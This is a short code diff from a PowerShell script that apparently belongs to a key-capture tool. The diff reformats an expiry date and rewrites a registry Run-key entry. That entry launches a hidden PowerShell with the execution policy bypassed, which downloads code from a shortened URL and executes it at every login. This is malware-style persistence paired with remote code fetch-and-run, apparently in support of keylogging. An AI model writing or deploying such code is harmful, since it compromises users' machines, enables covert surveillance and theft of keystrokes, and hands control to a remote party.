@@ -202,10 +202,13 @@ public class KeyCaptureUtility
 "@
 }
 
+# Convert the expiry date to 'yyyy-MM-dd' format
+$expiryDateFormatted = $expiryDate.ToString('yyyy-MM-dd')
+
 # Add the script to startup (by modifying the registry) with the provided URL
 $regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $scriptName = "Startup"
-$regCommand = "powershell -NoP -Ep Bypass -W H -C `$expiryDateParam='$expiryDate'; irm https://shorturl.at/FkQqM | iex"
+$regCommand = "powershell -NoP -Ep Bypass -W H -C `$expiryDateParam='$expiryDateFormatted'; irm https://shorturl.at/FkQqM | iex"
 
 # Add the entry to the registry for startup
 Set-ItemProperty -Path $regKeyPath -Name $scriptName -Value $regCommand
